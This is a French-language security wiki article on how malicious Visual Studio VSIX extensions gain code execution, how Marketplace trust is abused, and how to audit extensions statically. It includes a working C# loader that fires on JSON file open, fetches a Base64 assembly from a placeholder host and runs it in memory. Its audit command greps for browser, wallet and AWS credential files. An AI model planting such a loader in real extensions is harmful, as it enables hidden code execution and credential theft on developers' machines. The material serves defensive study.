# Abus des extensions VSIX de Visual Studio

{{#include ../banners/hacktricks-training.md}}

Une extension Visual Studio peut transformer une activité courante dans l’éditeur en exécution de code avec l’identité de l’utilisateur connecté. Un VSIX malveillant, un éditeur usurpant l’identité d’un autre ou une mise à jour d’extension compromise peuvent atteindre cet utilisateur par les canaux d’installation habituels. Une installation avec une invite d’administrateur est un parcours d’installation avec consentement, et non une élévation automatique de privilèges.<sup>[[1]](#references)</sup>

## Modèle d’exécution

Les extensions VSSDK classiques s’exécutent généralement dans `devenv.exe`. Le modèle plus récent `VisualStudio.Extensibility` exécute principalement les extensions .NET modernes hors processus : Visual Studio relaie les appels vers un processus dédié `Microsoft.ServiceHub.Host.Extensibility`, ce qui préserve la stabilité de l’IDE, mais **ne** place **pas** l’extension dans un sandbox vis-à-vis des permissions Windows de l’utilisateur. Le nom exact de l’exécutable peut inclure un suffixe d’architecture, comme `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Déclenchement lors d’une activité courante dans l’éditeur

Au lieu de proposer uniquement une commande de menu bien visible, une extension peut implémenter `ITextViewOpenClosedListener`. Son callback `TextViewOpenedAsync` est appelé pour les documents correspondants, tandis que `TextViewExtensionConfiguration.AppliesTo` peut limiter l’activation à un type courant, comme JSON. Un formateur ou un linter légitime peut tout de même effectuer le travail annoncé pendant qu’une seconde action s’exécute en parallèle à l’ouverture d’un fichier.<sup>[[1]](#references)[[3]](#references)</sup>

Le modèle simplifié suivant montre les points d’exécution importants ; il omet le formateur légitime et la gestion des erreurs par souci de clarté.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Chargeur d’assembly managé en mémoire déclenché par un événement</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Cette chaîne télécharge du texte Base64, le décode en octets d’assembly, le charge depuis un `MemoryStream` via un `AssemblyLoadContext` déchargeable, invoque le `EntryPoint` réfléchi sans paramètres ou avec un `string[]`, attend les points d’entrée asynchrones, puis décharge le contexte. Le second stage n’est pas écrit sur le disque, bien que le VSIX et la DLL principale de l’extension restent des artefacts sur disque. Base64 n’offre ni authenticité ni confidentialité ; l’utilisation de HTTP permet également à un attaquant situé sur le chemin de remplacer la réponse.<sup>[[1]](#references)</sup>

Les variantes opérationnelles incluent la suppression de toutes les exceptions afin que la fonctionnalité annoncée continue de fonctionner en cas d’échec du staging, ou l’utilisation de `ITextViewChangedListener` pour déclencher l’exécution après des modifications. Le code s’exécute dans l’hôte d’extension et peut utiliser les API managées, P/Invoke, les fichiers, les identifiants et les processus enfants accessibles à cet utilisateur.<sup>[[1]](#references)</sup>

Pour une surface d’exécution connexe, spécifique à un éditeur et fondée sur le chargement automatique de plugins natifs, voir :

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Abus de confiance liés à Marketplace et à la distribution

Un VSIX peut être reçu sous forme de fichier partagé directement ou par phishing, depuis le Marketplace en ligne, ou via le navigateur Marketplace intégré à Visual Studio. L’enregistrement des éditeurs, qui impose principalement l’unicité et une liste de mots réservés, peut permettre des identités d’éditeur visuellement trompeuses ; compromettre un éditeur ou une extension déjà approuvé est encore plus efficace, car cela permet de bénéficier d’une base d’utilisateurs installés. L’installation depuis Marketplace invoque Visual Studio Installer et place temporairement le VSIX téléchargé sous `%LOCALAPPDATA%\Temp` ; `payload.vsix` est également utilisé de manière légitime, le nom de fichier seul n’est donc pas un indicateur.<sup>[[1]](#references)</sup>

MDSec n’a pas identifié de protocole d’URL Visual Studio permettant d’installer directement une extension. Un opérateur doit tout de même amener l’utilisateur à installer/approuver le VSIX, ou compromettre le canal de distribution d’une extension existante. Un package `AllUsers` s’installe dans le dossier d’installation de Visual Studio et peut demander une élévation, mais il s’agit d’un comportement normal de l’installateur nécessitant le consentement de l’utilisateur, et non d’un moyen automatique d’obtenir les privilèges d’administrateur ou SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Audit statique à grande échelle

Les packages VSIX sont généralement des conteneurs ZIP. Un pipeline sûr d’examen du Marketplace peut donc énumérer les packages, les décompresser **sans charger le code des extensions**, analyser les manifestes, identifier les surfaces exécutables et décompiler les assemblies managés avec `ilspycmd`. Donnez la priorité aux assemblies appartenant aux extensions après exclusion des dépendances courantes fournies avec celles-ci, puis mettez en corrélation les chaînes liées aux magasins d’identifiants avec des groupes de comportements tels que lecture de fichiers et envoi réseau, encodage et envoi, téléchargement et exécution, gestionnaire d’identifiants et accès réseau, ou capture d’écran et envoi.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inventoriez également les DLL natives, les cibles MSBuild, les scripts, les modèles T4 et les charges utiles des installateurs, plutôt que de supposer que toutes les surfaces d’exécution sont du code managé. Comparez les comportements suspects à l’objectif déclaré dans le manifeste ; la télémétrie et les programmes de mise à jour légitimes peuvent ressembler à de l’exfiltration ou à du staging. Un examen statique seul ne détecte pas le code empaqueté, obfusqué, résolu dynamiquement ou dormant, et examiner uniquement la dernière version ne permet pas de repérer les versions historiques malveillantes.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Extensions Visual Studio revisitées](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - À propos de VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomie d’un package VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - outil .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
